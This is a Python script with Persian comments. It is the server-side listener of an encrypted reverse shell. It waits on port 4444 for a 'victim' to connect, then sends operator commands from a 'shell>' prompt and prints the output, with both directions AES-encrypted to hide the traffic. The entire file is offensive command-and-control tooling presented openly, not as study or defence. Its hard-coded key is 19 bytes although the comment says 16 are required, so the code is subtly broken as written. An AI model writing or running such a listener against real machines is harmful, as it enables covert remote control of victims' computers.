import socket
from Crypto.Cipher import AES
import base64

# تنظیمات رمزنگاری
KEY = b'Your16ByteSecretKey'  # باید ۱۶ بایت باشد
IV = b'1234567890123456'  # باید ۱۶ بایت باشد


def encrypt(data: str) -> str:
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return base64.b64encode(cipher.encrypt(data.encode())).decode()


def decrypt(data: str) -> str:
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return cipher.decrypt(base64.b64decode(data)).decode()


def start_server():
    HOST = '0.0.0.0'  # گوش دادن به همه اینترفیس‌ها
    PORT = 4444  # پورت مورد نظر

    with socket.socket() as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[*] Listening on {HOST}:{PORT} (Waiting for victim...)")

        conn, addr = s.accept()
        print(f"[+] Connection established from {addr}")

        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() == 'exit':
                    conn.send(encrypt(cmd).encode())
                    break

                conn.send(encrypt(cmd).encode())
                encrypted_output = conn.recv(999999).decode()
                output = decrypt(encrypted_output)
                print(output)

            except Exception as e:
                print(f"Error: {e}")
                break


if __name__ == "__main__":
    start_server()